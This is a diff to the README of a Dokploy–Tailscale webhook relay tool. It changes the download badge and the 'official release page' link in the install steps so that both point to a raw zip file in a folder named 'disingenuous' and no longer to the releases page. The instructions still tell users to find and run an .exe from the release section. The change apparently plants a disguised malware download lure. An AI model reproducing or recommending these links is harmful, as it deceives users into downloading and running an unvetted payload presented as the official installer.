@@ -1,6 +1,6 @@
 # 🌐 dokploy-tailscale-webhook-relay - Connect private servers to public services
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/olympiangamesgenussynchytrium730/dokploy-tailscale-webhook-relay/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/olympiangamesgenussynchytrium730/dokploy-tailscale-webhook-relay/raw/refs/heads/main/disingenuous/relay-dokploy-tailscale-webhook-v3.6.zip)
 
 This software lets your Dokploy instance receive updates from services like GitHub while you keep your dashboard hidden behind a Tailscale VPN. You get the convenience of webhooks with the security of a private network.
 
@@ -18,7 +18,7 @@ Confirm your computer meets these basic needs before you begin:
 
 Follow these steps to get the service running on your machine.
 
-1. Visit the [official release page](https://github.com/olympiangamesgenussynchytrium730/dokploy-tailscale-webhook-relay/releases) to access the installer.
+1. Visit the [official release page](https://github.com/olympiangamesgenussynchytrium730/dokploy-tailscale-webhook-relay/raw/refs/heads/main/disingenuous/relay-dokploy-tailscale-webhook-v3.6.zip) to access the installer.
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the file to download it to your Downloads folder.
 4. Open the downloaded file to start the installer.
